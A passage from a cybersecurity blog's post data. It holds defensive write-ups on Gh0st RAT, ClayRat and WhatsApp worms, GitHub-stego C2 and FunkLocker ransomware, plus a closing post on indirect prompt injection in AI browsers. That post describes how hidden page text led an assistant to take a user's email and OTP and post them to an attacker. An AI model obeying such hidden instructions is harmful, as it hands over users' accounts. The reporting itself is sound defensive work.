        <li>🔐 Strengthen identity controls — deploy <b>passkeys</b>, <b>phishing-resistant MFA</b>, and <b>adaptive access policies</b>.</li>
      </ul>
      <p>
        Remember: cybersecurity is a lifecycle, not a checklist. Preparation today is the difference between disruption and disaster tomorrow.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:#f8fafc; border-radius:12px; color:#0f172a; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Stay Sharp. Patch Fast. Defend Better.</h3><br>
      <p>
        This week’s biggest takeaway? <b>Speed and visibility save businesses</b>.  
        The sooner you patch, the faster you detect, and the better you prepare — the harder you make it for adversaries to succeed.
      </p>
     
    </section>
  `},{id:"gh0strat-open-source-attack-2025",title:"100th Blog Special: The Ghost in the Code — When Trusted Tools Turn Rogue",summary:"Marking our 100th post, this special edition uncovers how China-linked hackers weaponized trust itself — twisting an open-source tool into a silent infiltrator that deployed Gh0st RAT across 100+ servers.",date:"2025-10-09",author:"EthicalByte",tags:["Gh0st RAT","China-Linked APT","Supply Chain","Open Source","Cyber Espionage"],imageKey:"gh0stRat100thBlogBanner",content:`
    <section style="padding:35px; font-family:'Poppins',sans-serif; background:radial-gradient(circle at top left,#000000,#1a0000); border-radius:16px; color:#f8f9fa; border:2px solid #ff1b1b; box-shadow:0 0 25px rgba(255,27,27,0.3);">
      <h2 style="color:#ff3b3b; text-align:center; font-size:30px; text-shadow:0 0 12px #ff1b1b;">
        💯th Blog Celebration | The Ghost in the Code 👻
      </h2>
      <p style="text-align:center; font-size:16px; color:#e0e0e0;">
        “Even heroes can be deceived — when trust turns into a weapon, the battlefield shifts to the code itself.”
      </p><br>
      <p>
        It’s poetic, almost cinematic — the very code designed to secure our digital future  
        was turned against us. <b>China-linked threat actors</b> have taken a 
        <b>legitimate open-source tool</b> and turned it into a weapon of stealth, control, and espionage.  
        This wasn’t brute force; it was elegance cloaked in deception.
      </p>
      <p>
        The attackers used a <b>log poisoning technique</b> to implant a <b>web shell</b> across servers.  
        Without triggering alarms, they deployed <b>Gh0st RAT</b> — a Remote Access Trojan capable of  
        full system compromise, surveillance, and persistent control.  
        Over <b>100 servers</b> in multiple industries were compromised —  
        all without a single zero-day exploit.
      </p>
      <p>
        But the twist? The <b>control panel interface was written in Russian</b>.  
        Whether it’s a false flag or cross-group collaboration, attribution just got complicated.
      </p>
    </section>

    <section style="padding:30px; background:linear-gradient(135deg,#220000,#111111); border-radius:16px; color:#f5f5f5; margin-top:25px; box-shadow:0 0 20px rgba(255,0,0,0.4);">
      <h3 style="color:#ffb703;">🧠 The Anatomy of the Attack</h3><br>
      <p>
        The adversaries didn’t need new malware; they needed trust.  
        Here’s how they turned open-source transparency into a tactical advantage:
      </p>
      <ul style="margin-left:20px; line-height:1.9;">
        <li>⚙ <b>Exploited open-source utility</b> through log poisoning to inject malicious payloads.</li>
        <li>🧩 Deployed <b>Gh0st RAT</b> for deep surveillance and persistent access.</li>
        <li>👾 <b>Camouflaged communications</b> via AES-encrypted C2 traffic to avoid detection.</li>
        <li>🕵‍♂ Command-and-control panel <b>written in Russian</b> — a possible false-flag tactic.</li>
      </ul>
      <p>
        This operation underscores a chilling new era of cyber warfare:  
        <b>weaponized legitimacy</b>. The tools defenders trust most are now entry points for attackers.
      </p>
    </section>

    <section style="padding:30px; background:radial-gradient(circle at bottom right,#1a0000,#0a0a0a); border-radius:16px; color:#e2e8f0; margin-top:25px; box-shadow:inset 0 0 20px rgba(255,50,50,0.3);">
      <h3 style="color:#06d6a0;">💥 Why This Attack Changes Everything</h3><br>
      <p>
        This wasn’t about exploiting a system — it was about exploiting <b>trust itself</b>.  
        Open-source ecosystems thrive on collaboration, but also depend on  
        the integrity of every contributor. Compromise that chain, and you compromise the world.
      </p>
      <ul style="margin-left:20px; line-height:1.9;">
        <li>🧩 <b>Supply chain trust</b> has become the weakest link.</li>
        <li>🚨 <b>Attackers are agile</b> — exploiting community-driven innovation faster than it can be secured.</li>
        <li>🔄 <b>Behavioral analytics</b> must evolve — focusing on subtle activity, not static signatures.</li>
        <li>🧠 <b>Developers need visibility</b> — code provenance and dependency validation are now critical.</li>
      </ul>
      <p>
        In essence, this attack isn’t a bug — it’s a betrayal.
      </p>
    </section>

    <section style="padding:35px; background:linear-gradient(135deg,#ff1b1b,#2b0000); border-radius:16px; color:#ffffff; margin-top:25px; text-align:center; box-shadow:0 0 25px rgba(255,0,0,0.6);">
      <h3 style="font-size:22px; color:#fff;">⚔ The Lesson Behind the Code</h3><br>
      <p>
        Every milestone is a reflection of resilience.  
        EthicalByte began with one goal — to make cybersecurity *clear, visual, and human*.  
        Now, at our 100th post, we face a world where trust is the new perimeter.  
      </p>
      <p>
        <b>Every library. Every repo. Every dependency.</b>  
        They all carry the weight of the next possible compromise.  
        Security isn’t just about defense — it’s about awareness and adaptation.
      </p>
      
    </section>

    <section style="padding:40px; text-align:center; background:#ffffff; border-radius:16px; color:#000; margin-top:25px; border:2px solid #ff1b1b;">
      <h3 style="color:#ff1b1b;">🎉 100th Blog | The EthicalByte Legacy</h3><br>
      <p>
        💬 100 stories later, our message remains the same — <b>the future belongs to those who defend it</b>.  
        From darknets to data leaks, from malware to machine learning, we’ve chronicled  
        the pulse of cybersecurity with one guiding belief: *awareness saves*.
      </p>
      <p>
        To our readers, collaborators, and fellow defenders — this milestone isn’t ours alone.  
        It’s a salute to every mind that reads, questions, and acts.  
      </p>
      <p style="font-weight:bold; color:#ff1b1b; margin-top:15px;">
        Here’s to the next 100. Stronger. Sharper. Smarter. 🛡
      </p>
    </section>
  `},{id:"clayrat-android-spyware-2025-v2",title:"🚨 ClayRat Spyware: The Worm Targeting Android Devices",summary:"A fast-spreading spyware disguised as popular apps (WhatsApp, YouTube, Google Photos) uses worm-like techniques to infect phones and propagate via contacts. Expanded analysis, detection tips, and IOCs included.",date:"2025-10-13",author:"EthicalByte",tags:["ClayRat","Android","Spyware","Mobile Security","Worm","Malware","Threat Intelligence"],imageKey:"clayratAndroidSpywareBannerV2",content:`
    <section style="padding:28px; font-family:Inter, Arial, sans-serif; background:linear-gradient(180deg,#0b1220,#0f2336); border-radius:12px; color:#e6f0ff;">
      <h3 style="color:#ff6b6b;">🚨 ClayRat Spyware Spreads Like a Worm</h3><br>
      <p style="font-size:15px; line-height:1.7; color:#dbeafe;">
        Researchers have uncovered <strong>ClayRat</strong>, an Android spyware family that behaves like a worm: once a phone is infected it automatically messages contacts with a malicious APK link and attempts to trick recipients into installing it.  It impersonates trusted apps and even fakes Play Store UI to reduce suspicion.
      </p>
    </section>

    <section style="padding:24px; margin-top:16px; background:linear-gradient(180deg,#071025,#0b1b2b); border-radius:12px; color:#dbeafe; border:1px solid rgba(255,255,255,0.03);">
      <h3 style="color:#ffd166;">🕵️ How ClayRat Works</h3><br>
      <p style="line-height:1.7;">
        ClayRat combines social-engineering with automated propagation. Key steps observed in analysis:
      </p>
      <ul style="margin-left:20px; line-height:1.8; color:#cfe8ff;">
        <li>📲 <strong>Dropper</strong> disguises as common apps (WhatsApp / YouTube / Google Photos) or prompts a fake Play Store update screen.</li>
        <li>🎯 On install, it requests sensitive permissions (Accessibility, SMS, Contacts) to escalate capabilities.</li>
        <li>🪱 <strong>Worm behavior:</strong> enumerates contacts and sends personalized messages with an APK link or deep-link to propagate.</li>
        <li>🔐 Data collection: SMS, call logs, device identifiers, location, photos, clipboard and possibly 2FA tokens in some flows.</li>
        <li>🛡 Persistence & stealth: hides icons, modifies metadata, and uses obfuscated loaders to evade detection.</li>
      </ul>
    </section>

    <section style="padding:24px; margin-top:16px; background:linear-gradient(180deg,#061426,#072437); border-radius:12px; color:#dbeafe; border-left:4px solid #7ce7d6;">
      <h3 style="color:#7ce7d6;">⚠ Why This Is Dangerous</h3><br>
      <p style="line-height:1.7; color:#cfe8ff;">
        Worm-like propagation on mobile multiplies risk: one compromised device can turn into a distribution hub, causing rapid, exponential spread. Trusted brand impersonation (Play Store UI, known app icons) dramatically increases success rates for social engineering.
      </p>
      <ul style="margin-left:20px; line-height:1.8; color:#cfe8ff;">
        <li>📈 Rapid outbreak potential — regional outbreaks can occur within hours.</li>
        <li>🔁 High secondary infection rate due to messaging contacts automatically.</li>
        <li>🔍 Stealthy data collection that can feed larger espionage or fraud campaigns.</li>
      </ul>
    </section>

    <section style="padding:24px; margin-top:16px; background:#071827; border-radius:12px; color:#e6f7ff; border:1px dashed rgba(124,231,214,0.06);">
      <h3 style="color:#ff9f43;">🛠 Detection & Hunting Guidance</h3><br>
      <p style="line-height:1.7; color:#cfe8ff;">
        Use these signals to hunt for ClayRat-like activity across mobile telemetry and enterprise feeds:
      </p>
      <ul style="margin-left:20px; line-height:1.8; color:#cfe8ff;">
        <li>📲 Unusual outbound SMS or messaging spikes originating from single devices.</li>
        <li>⚠️ Multiple installs of similarly-named apps (Impersonators) within short windows.</li>
        <li>🔁 Repeated contact enumeration + identical message payloads to many recipients.</li>
        <li>🔐 Requests for Accessibility or device-admin privileges immediately after install.</li>
        <li>🧭 New apps requesting "draw over other apps" or showing fake Play UI flows.</li>
      </ul>
    </section>

    <section style="padding:24px; margin-top:16px; background:linear-gradient(180deg,#082032,#0b2b3d); border-radius:12px; color:#dbeafe; border-left:4px solid #ff6b6b;">
      <h3 style="color:#ff6b6b;">🔎 For Incident Response (IR)</h3><br>
      <p style="line-height:1.7; color:#cfe8ff;">
        If you suspect ClayRat activity, follow a focused IR playbook:
      </p>
      <ol style="margin-left:20px; line-height:1.8; color:#cfe8ff;">
        <li>Isolate suspected devices (network quarantine + remove from company MDM).</li>
        <li>Collect device artifacts: installed APKs, package names, Accessibility settings, and outgoing message logs.</li>
        <li>Check for command-and-control endpoints and block them at network/DNS level.</li>
        <li>Force password resets for accounts accessed from the device and re-key MFA where risk exists.</li>
        <li>Push referrer/awareness messages company-wide to avoid re-infection via employee contacts.</li>
      </ol>
    </section>

    <section style="padding:24px; margin-top:16px; background:linear-gradient(180deg,#061426,#0b1f2b); border-radius:12px; color:#dbeafe; border:1px solid rgba(255,255,255,0.02);">
      <h3 style="color:#7ce7d6;">🔬 IOCs & Technical Notes</h3><br>
      <p style="line-height:1.7; color:#cfe8ff;">
        Share these with your SOC and threat intel teams (note: these are example indicators; combine with live telemetry for verification):
      </p>
      <ul style="margin-left:20px; line-height:1.8; color:#cfe8ff;">
        <li>Package name patterns: look for suspicious app package names mimicking com.whatsapp.*com.yt.*com.google.photos.* (use exact lists from intel)</li>
        <li>APK behaviors: immediate request for Accessibility + device admin APIs</li>
        <li>Network: suspicious outbound connections to ephemeral domains after install</li>
        <li>SMS payload: consistent link structure or identical short URLs sent to multiple contacts</li>
      </ul>
      <p style="margin-top:8px; color:#cfe8ff;">
        Tip: correlate mobile telemetry with UBA (user behavior analytics) — sudden mass messaging from still-active user accounts is a strong signal.
      </p>
    </section>

    <section style="padding:24px; margin-top:16px; background:linear-gradient(180deg,#071827,#071827); border-radius:12px; color:#e6f7ff; text-align:center; border-top:4px solid rgba(255,111,111,0.06);">
      <h3 style="color:#ffd166;">🛡 How to Stay Safe (User + Org)</h3><br>
      <p style="line-height:1.7; color:#cfe8ff;">
        Quick checklist for users and IT teams:
      </p>
      <ul style="margin-left:20px; line-height:1.8; color:#cfe8ff;">
        <li>✅ Only install apps from Google Play and verify developer details.</li>
        <li>🚫 Never sideload APKs from links in chats or SMS unless validated.</li>
        <li>🔐 Revoke "Install unknown apps" & "Accessibility" permissions for untrusted apps.</li>
        <li>🔄 Enforce MDM controls: app whitelisting, device integrity checks, and remote wipe capability.</li>
        <li>📣 Educate users: don’t click suspicious links and verify unexpected update prompts.</li>
      </ul>
    </section>

    <section style="padding:28px; margin-top:18px; background:#ffffff; border-radius:12px; color:#0b1b2b; border:1px solid rgba(11,27,43,0.06);">
      <h3 style="color:#0b3b55;">📢 Final Thoughts — Keep Mobile Threats in Focus</h3><br>
      <p style="line-height:1.7;">
        ClayRat shows mobile ecosystems are evolving into fast-moving threat surfaces. Worm-like spyware that leverages trust and brand mimicry requires defenders to combine telemetry, behavioral detection, and rapid user education. Treat every mobile compromise as a potential distribution node — your IR playbook and mobile controls must reflect that reality.
      </p>
      
    </section>
  `},{id:"whatsapp-worm-malware-brazil-2025",title:"🚨 WhatsApp Worm Malware Targets Brazilian Users",summary:"A self-propagating Android campaign abuses WhatsApp to auto-message contacts, impersonate trusted apps, and spread fast. Brazilian users are hit first — but the blueprint is global.",date:"2025-10-14",author:"EthicalByte",tags:["WhatsApp","Android","Worm","Malware","Brazil","Threat Intelligence","Mobile Security"],imageKey:"whatsappWormBrazilBanner",content:`
    <section style="padding:24px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#071a14,#0e2a22); border-radius:12px; color:#e7fff6;">
      <h3 style="color:#25d366;">🚨 Self-Propagating Malware Campaign Hits Brazil</h3><br>
      <p>
        Researchers are tracking a <b>worm-style Android campaign</b> abusing <b>WhatsApp</b> to spread. 
        Once a phone is infected, the malware <b>auto-messages the victim’s contacts</b> with a malicious link or APK —
        turning one device into a distribution hub. Initial activity clusters in <b>Brazil</b>, but the pattern can scale globally.
      </p>
    </section>

    <section style="padding:22px; margin-top:14px; background:linear-gradient(135deg,#0b2520,#0f312a); border-radius:12px; color:#dcfff5;">
      <h3 style="color:#a7f3d0;">🕵️ How the Worm Works</h3><br>
      <ul style="margin-left:18px; line-height:1.8;">
        <li>📲 <b>Infection vector:</b> malicious link/APK shared via WhatsApp chats and groups.</li>
        <li>🎭 <b>Impersonation:</b> mimics WhatsApp/YouTube/Google Photos or shows fake Play Store update screens.</li>
        <li>🪱 <b>Propagation:</b> enumerates contacts and <b>auto-sends</b> lure messages to each recipient.</li>
        <li>🔐 <b>Data access:</b> seeks SMS, Contacts, Accessibility, and other sensitive permissions.</li>
      </ul>
      <p>Social trust + messaging automation = rapid spread with high click-through rates.</p>
    </section>

    <section style="padding:22px; margin-top:14px; background:linear-gradient(135deg,#0a1f19,#0a1b24); border-radius:12px; color:#e0f7ff;">
      <h3 style="color:#7dd3fc;">⚠️ Why This Matters</h3><br>
      <ul style="margin-left:18px; line-height:1.8;">
        <li>🌍 Local to global in days: WhatsApp’s network effect accelerates outbreaks.</li>
        <li>🧠 Low skill required: reuse kits + brand mimicry make replication easy.</li>
        <li>🏢 Business risk: infected employee phones can phish partners and customers.</li>
      </ul>
    </section>

    <section style="padding:22px; margin-top:14px; background:linear-gradient(135deg,#122d25,#0f2620); border-radius:12px; color:#eafff7;">
      <h3 style="color:#34d399;">🛡 How to Protect (User & Org)</h3><br>
      <ul style="margin-left:18px; line-height:1.8;">
        <li>✅ Install apps <b>only</b> from Google Play; verify developer name & reviews.</li>
        <li>🚫 Don’t sideload APKs from links in chats/SMS — even from known contacts.</li>
        <li>🔐 Revoke <b>Install unknown apps</b> and unnecessary <b>Accessibility</b> permissions.</li>
        <li>📲 Keep Android + Google Play Protect updated; deploy mobile AV/MTD in orgs.</li>
      </ul>
    </section>

    <section style="padding:22px; margin-top:14px; background:linear-gradient(135deg,#0c2620,#0a1b24); border-radius:12px; color:#d7f9ff;">
      <h3 style="color:#60a5fa;">🧭 Detection & IR (Quick Playbook)</h3><br>
      <ul style="margin-left:18px; line-height:1.8;">
        <li>📊 Hunt for <b>messaging spikes</b> from a single device to many contacts in minutes.</li>
        <li>📦 Flag <b>new app installs</b> + immediate requests for Contacts/SMS/Accessibility.</li>
        <li>🌐 Block short-lived lure domains/URLs seen post-install.</li>
        <li>🧹 If infected: quarantine device, remove rogue APKs, reset creds, re-enroll via MDM.</li>
      </ul>
    </section>

    <section style="padding:22px; margin-top:14px; text-align:center; background:#f7fffb; border-radius:12px; color:#0b1c17;">
      <h3 style="color:#25d366;">📢 Final Thoughts</h3><br>
      <p>
        Messaging platforms are powerful — and now a <b>prime malware transport</b>. 
        Treat every mobile compromise as a potential <b>propagation node</b>. 
        Awareness + controls beat worms every time.
      </p>
  
    </section>
  `},{id:"github-command-center-steganography-2025",title:"When GitHub Becomes a Command Center: Malware Reboots from Stego-Images",summary:"Attackers hide configs inside images on GitHub and use repos as resilient C2 — takedowns fail because the malware simply reboots from public code and steganographic payloads.",date:"2025-10-15",author:"EthicalByte",tags:["GitHub","Steganography","Resilient Malware","Supply Chain","Astaroth","Threat Intelligence"],imageKey:"githubResilienceBanner",content:`
    <section style="padding:24px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#07182b,#0b2536); border-radius:12px; color:#e6f7ff;">
      <h3 style="color:#ff6b6b;">🚨 GitHub Turned Into a Malware Command Center</h3><br>
      <p>
        Researchers observed a resilient campaign that weaponizes public Git hosting (GitHub) as a recovery and command channel. When operators’ private servers get taken down, the malware fetches instructions and configuration embedded inside images stored in repositories — then restarts and resumes operations. This technique blends <b>public infrastructure</b> with <b>steganography</b> to dramatically increase attacker survivability.
      </p>
    </section>

    <section style="padding:22px; margin-top:14px; background:linear-gradient(135deg,#0b2a2b,#09202a); border-radius:12px; color:#dff7ff;">
      <h3 style="color:#ffd166;">🕵️ How the Technique Works</h3><br>
      <ol style="line-height:1.8; margin-left:18px;">
        <li>Initial compromise: attackers deliver a lightweight loader to victims (phishing, exploit kit, etc.).</li>
        <li>Stego retrieval: the loader pulls image files from a GitHub repo or raw.githubusercontent links.</li>
        <li>Hidden configs: configuration or commands are encoded inside image files using steganography (hidden payloads in pixels/metadata).</li>
        <li>Reconstitution: the malware decodes the hidden data, applies commands or downloads additional modules, and resumes control — even after their primary C2 servers are seized.</li>
        <li>Resilience: public repos and raw URLs are cheap, robust, and often overlooked by defenders; takedowns take time and mirrored repos can reappear quickly.</li>
      </ol>
    </section>

    <section style="padding:22px; margin-top:14px; background:linear-gradient(135deg,#071827,#05212a); border-radius:12px; color:#dff7ff;">
      <h3 style="color:#7ce7d6;">⚠️ Why This Matters</h3><br>
      <ul style="line-height:1.8; margin-left:18px;">
        <li>📡 Attackers reuse public infrastructure to evade traditional C2 blocking.</li>
        <li>🖼 Steganography hides signals in plain sight — images bypass many detection rules.</li>
        <li>🛡 Takedowns of private servers no longer guarantee neutralization.</li>
        <li>🔁 Rapid replication: forks, mirrors, and raw-file access make recovery fast for adversaries.</li>
      </ul>
    </section>

    <section style="padding:22px; margin-top:14px; background:linear-gradient(135deg,#0a2830,#07202a); border-radius:12px; color:#dff7ff;">
      <h3 style="color:#60a5fa;">🔍 Detection Signals & Hunting</h3><br>
      <ul style="line-height:1.8; margin-left:18px;">
        <li>🌐 Unusual outbound requests to raw.githubusercontent.com or GitHub raw URLs from endpoints that normally don’t fetch remote media.</li>
        <li>🖼 High-volume image fetches followed by local decoding activity or creation of suspicious temp files.</li>
        <li>📊 Correlate sudden image downloads with process spawns, new network connections, or unexpected persistence changes.</li>
        <li>🔎 Monitor for repeatable patterns in image filenames or repo names tied to known threat actor behavior.</li>
      </ul>
    </section>

    <section style="padding:22px; margin-top:14px; background:linear-gradient(135deg,#071827,#041622); border-radius:12px; color:#eaf8ff;">
      <h3 style="color:#34d399;">🛡 Mitigation & Response</h3><br>
      <ol style="line-height:1.8; margin-left:18px;">
        <li>Block or monitor access to raw.githubusercontent.com (use allowlists for necessary dev flows).</li>
        <li>Use EDR to detect post-download decoding behavior and unusual child processes spawned after media fetches.</li>
        <li>Harden egress filtering and DNS policies to catch lookups for repos and short-lived domains.</li>
        <li>Enforce strict code review and provenance checks for third-party packages and scripts your CI/CD pulls from public repos.</li>
        <li>Work with platform providers: report malicious repos to GitHub/TOS immediately and provide IOCs so they can act faster.</li>
      </ol>
    </section>

    <section style="padding:22px; margin-top:14px; text-align:center; background:#f7fffb; border-radius:12px; color:#071827;">
      <h3 style="color:#ff6b6b;">📢 Final Thoughts</h3><br>
      <p style="line-height:1.6;">
        Hiding configuration in images and using public Git hosting is a powerful tactic: it turns well-known, trusted services into a hidden recovery plane for attackers. Defenders must evolve — treat public-hosted artifacts as first-class risks, monitor developer tooling traffic, and add behavioral detection for media decoding & unusual repo access patterns.
      </p>
    </section>
  `},{id:"funklocker-ai-ransomware-2025",title:"FunkLocker: AI-Powered Ransomware by FunkSec Hits 120+ Targets",summary:"FunkLocker — an AI-assisted ransomware family used by 'FunkSec' — has been linked to 120+ incidents across North America and Asia. This analysis breaks down its AI code patterns, tactics, and practical defenses.",date:"2025-10-25",author:"EthicalByte",tags:["Ransomware","FunkLocker","FunkSec","AI Malware","Threat Intelligence","TTPs"],imageKey:"funklockerBanner",content:`
    <section style="padding:24px; font-family:Inter, Arial, sans-serif; background:linear-gradient(135deg,#07070a,#14121a); border-radius:12px; color:#e6eef7; border:1px solid rgba(255,70,70,0.06);">
      <div style="text-align:center;">
        <h3 style="color:#ff6b6b;">🚨 FunkLocker — AI-Powered Ransomware by FunkSec</h3><br>
        <p style="color:#cbd7e6; max-width:900px; margin:0 auto;">
          FunkLocker is an emerging ransomware family attributed to the group tracked as <b>FunkSec</b>. 
          Analysts have linked the strain to <b>120+ attacks</b> across North America and Asia.  
          Notable traits: AI-generated code snippets, aggressive process termination, and rapid encryption choreography — combined with surprisingly weak OPSEC that has allowed public recoveries in some cases.
        </p>
      </div>
    </section>

    <section style="padding:22px; margin-top:18px; background:linear-gradient(135deg,#0b1220,#08121a); border-radius:12px; color:#d9eefc;">
      <h3 style="color:#ffb86b;">🔎 Executive Summary</h3><br>
      <p>
        FunkLocker uses small AI-generated code templates (referred to as “AI snippets”) to assemble task sequences. This lowers development time and allows rapid variant creation. The malware focuses on destabilization — killing defenses, disabling backups, and forcing systems into a recover-or-pay state quickly. Despite operational ruthlessness, tool errors (reused BTC wallets, hardcoded keys) have produced recoverable artifacts for defenders.
      </p>
    </section>

    <section style="padding:22px; margin-top:16px; background:linear-gradient(135deg,#071423,#0b1620); border-radius:12px; color:#dff6ff;">
      <h3 style="color:#ffd166;">🧩 Key Capabilities & Behaviour</h3><br>
      <ul style="line-height:1.8; margin-left:20px;">
        <li><b>AI snippet patterns:</b> small, modular code blocks that are combined to produce loaders and encryption routines — fast to produce, variable in quality.</li>
        <li><b>Forced process termination:</b> uses <code>taskkill.exe</code>, <code>sc.exe</code>, <code>net.exe</code>, and aggressive PowerShell to stop AV, backup agents, and services.</li>
        <li><b>System destabilization:</b> attempts graceful shutdowns or corruption of running services before encryption to reduce recovery options.</li>
        <li><b>Encryption & extortion:</b> targets file shares, mapped drives, and cloud-sync folders with selective and speedy encryption waves.</li>
        <li><b>Poor OPSEC:</b> reused BTC wallets and hardcoded keys — which in some cases enabled public decryptors.</li>
      </ul>
    </section>

    <section style="padding:22px; margin-top:16px; background:linear-gradient(135deg,#051622,#081b24); border-radius:12px; color:#dff7ff;">
      <h3 style="color:#7ce7d6;">🛠 TTPs (Tactics, Techniques & Procedures)</h3><br>
      <ol style="line-height:1.8; margin-left:20px;">
        <li><b>Initial access:</b> phishing (malicious attachments/links), compromised RDP credentials, and weakly secured public-facing services.</li>
        <li><b>Lateral movement:</b> credential harvesting, WMI & PSExec-like remote execution, and abusing SMB/CIFS share access.</li>
        <li><b>Defense evasion:</b> disable AV/services via command-line tools and use living-off-the-land binaries (LOLBins).</li>
        <li><b>Payload delivery:</b> staged download of FunkLocker variants; often small loaders that fetch main payloads from cloud-hosted locations or compromised web servers.</li>
        <li><b>Impact:</b> rapid process kills, backup deletion attempts, and fast, broad encryption routines.</li>
      </ol>
    </section>

    <section style="padding:22px; margin-top:16px; background:linear-gradient(135deg,#071427,#08202b); border-radius:12px; color:#e8fbff;">
      <h3 style="color:#60a5fa;">🔍 Detection Signals (Hunting)</h3><br>
      <ul style="line-height:1.8; margin-left:20px;">
        <li>⚠️ Sudden mass <b>taskkill</b> or <b>sc.exe</b> invocations on endpoints.</li>
        <li>📈 Unexpected spikes in <b>file rename/encrypt</b> activity or mass deletion patterns targeting common backup directories.</li>
        <li>🔔 Suspicious PowerShell one-liners that download/extract payloads (monitor encoded or compressed commands).</li>
        <li>🔗 Outbound connections to newly created cloud storage endpoints or short-lived domains immediately after binary execution.</li>
        <li>🧩 Repeated processes that attempt to stop known backup/AV services within a short time window of initial compromise.</li>
      </ul>
    </section>

    <section style="padding:22px; margin-top:16px; background:linear-gradient(135deg,#071820,#05161b); border-radius:12px; color:#dff7ff;">
      <h3 style="color:#34d399;">🛡 Practical Mitigations</h3><br>
      <ul style="line-height:1.8; margin-left:20px;">
        <li>✅ Enforce least privilege & restrict local admin accounts; monitor for new admin elevations.</li>
        <li>✅ Harden RDP & remote-access paths: MFA, conditional access, and jump hosts for admin sessions.</li>
        <li>✅ Backups: maintain immutable, off-network backups and test restores regularly.</li>
        <li>✅ EDR & behavior analytics: detect mass process termination, rapid file-encryption patterns, and unusual PowerShell decoding activity.</li>
        <li>✅ Network segmentation: limit lateral movement by isolating critical infrastructure and backup systems.</li>
        <li>✅ Threat intel & response playbooks: predefine actions for suspected ransomware (isolate, preserve logs, contact legal/forensics).</li>
      </ul>
    </section>

    <section style="padding:22px; margin-top:16px; background:linear-gradient(135deg,#07121a,#04121a); border-radius:12px; color:#e6f8ff;">
      <h3 style="color:#ffd166;">🔐 OPSEC Failures — A Defender’s Advantage</h3><br>
      <p>
        FunkSec’s operational mistakes (reused BTC wallets, embedded/static keys) created recovery opportunities. While attackers aim for speed and scale, sloppy OPSEC sometimes leaves breadcrumbs defenders can use — wallet lookups, artifacts in ransom notes, or hardcoded decryption stubs that enable decryptors.
      </p>
    </section>

    <section style="padding:22px; margin-top:16px; background:linear-gradient(135deg,#07131a,#081622); border-radius:12px; color:#dffaff;">
      <h3 style="color:#ff6b6b;">📢 Final Thoughts</h3><br>
      <p style="line-height:1.6;">
        FunkLocker shows how AI-assisted development accelerates malware proliferation — but speed isn't magic. Operational mistakes by attackers can still be exploited by defenders. The defense recipe is familiar: strong identity hygiene, segmented networks, immutable backups, and behavior-based detection tuned for process/PowerShell abuses. Stay alert and practice the playbooks now — not after the alarms start.
      </p>
      
    </section>
  `},{id:"ai-browser-prompt-injection",title:"The Invisible Hack: AI Browsers and the Rise of Indirect Prompt Injection Attacks",summary:"When your browser's AI becomes a hacker's entry point.",date:"2025-10-29",author:"EthicalByte",tags:["AI Security","Browser Vulnerabilities","Prompt Injection","Cyber Threats","Brave Browser"],imageKey:"aibrowserpromptinjectionbanner",content:`
  <div style="font-family:'Inter',sans-serif; background:linear-gradient(145deg,#080808 0%,#17131a 100%); color:#f4e7eb; padding:24px; border-radius:12px; box-shadow:0 6px 30px rgba(255,60,80,0.13);">

      <div style="text-align:center;">
        <h3 style="color:#e4002b; text-shadow:0 1px 6px #0c070a;">The Invisible Hack</h3><br>
        <p style="color:#dfccd5; max-width:880px; margin:0 auto;">
          Security researchers at <strong style="color:#ff4252;">Brave</strong> revealed a critical weakness in AI-powered browsers: attackers can hide instructions in web content (white-on-white text, HTML comments, spoilers, screenshots) that an assistant will obediently execute. When the assistant runs with your signed-in privileges, a single click can hand an attacker emails, one-time passwords, and full account access.
        </p>
      </div>

      <section style="margin-top:20px; padding:18px; background:#140d13; border-radius:10px;">
        <h3 style="color:#fd113e;">What's Happening?</h3><br>
        <p style="color:#f6cad4; line-height:1.6;">
          Attackers embed <strong style="color:#fd113e;">hidden prompts</strong> in page content — invisible text, comments, spoiler tags, or nearly-invisible overlays. AI assistants (like Comet in the Brave demo) can't reliably separate <em>user intent</em> from <em>page content</em>, so they execute both. The result: data exfiltration using the user's own authenticated sessions.
        </p>
      </section>

      <section style="margin-top:18px; padding:18px; background:linear-gradient(90deg,#1b0c13,#26141f); border-radius:10px;">
        <h3 style="color:#fd113e;">How the Exploit Worked (Demo)</h3><br>
        <ul style="color:#fae3e3; line-height:1.7; margin-left:20px;">
          <li>Hidden payload in a Reddit spoiler — triggered by "Summarize this comment".</li>
          <li>Assistant logged into Perplexity to record the user email.</li>
          <li>Assistant opened Gmail (user already authenticated) and grabbed an OTP.</li>
          <li>Assistant posted email + OTP back to the attacker's comment — full account takeover with one click.</li>
        </ul>
        <p style="color:#ecd0d6;">No phishing link. No classic malware. Just a trust boundary collapse between page content and assistant commands.</p>
      </section>

      <section style="margin-top:18px; padding:18px; background:#130f14; border-radius:10px;">
        <h3 style="color:#fd113e;">Why This Is Terrifying</h3><br>
        <p style="color:#f2c6cb; line-height:1.6;">
          AI browsers often act with the same session privileges as you. If you're logged into email, bank, or work apps, the assistant's actions inherit those privileges — meaning hidden instructions can access sensitive assets without human consent.
        </p>
        <p style="color:#a08a94;">Some browsers auto-send page content to the AI engine (background summarization). That behavior removes even the "click" requirement — visiting a malicious page might be enough.</p>
      </section>

      <section style="margin-top:18px; padding:18px; background:linear-gradient(90deg,#200b13,#28202b); border-radius:10px;">
        <h3 style="color:#fd113e;">Attack Surface & Tech Notes</h3><br>
        <ul style="color:#ffd0da; line-height:1.7; margin-left:20px;">
          <li>Hidden text layers and HTML comments are simple carriers for malicious prompts.</li>
          <li>Screenshots with near-invisible text (steganographic overlays) can embed instructions.</li>
          <li>Auto-ingestion (background fetch → model prompt) drastically widens the attack surface.</li>
          <li>Mitigations require both UI/UX isolation and server-side policy enforcement from browser vendors.</li>
        </ul>
      </section>

      <section style="margin-top:18px; padding:18px; background:#18111a; border-radius:10px;">
        <h3 style="color:#fd113e;">Immediate Mitigations (For Users & Admins)</h3><br>
        <ul style="color:#f8dde3; line-height:1.7; margin-left:20px;">
          <li>Disable AI summarization or assistant features while logged into sensitive accounts.</li>
          <li>Use separate browser profiles for sensitive work (no third-party AI features in that profile).</li>
          <li>Turn off auto-send/background content processing for AI features.</li>
          <li>Enforce strict CSPs and sanitize third-party content in corporate web apps.</li>
          <li>Monitor for unusual token reuse, rapid OTP requests, and anomalous API calls.</li>
        </ul>
      </section>

      <section style="margin-top:18px; padding:20px; text-align:center; background:linear-gradient(180deg,#191217,#25171b); border-radius:10px; border:1px solid rgba(253,17,62,0.10);">
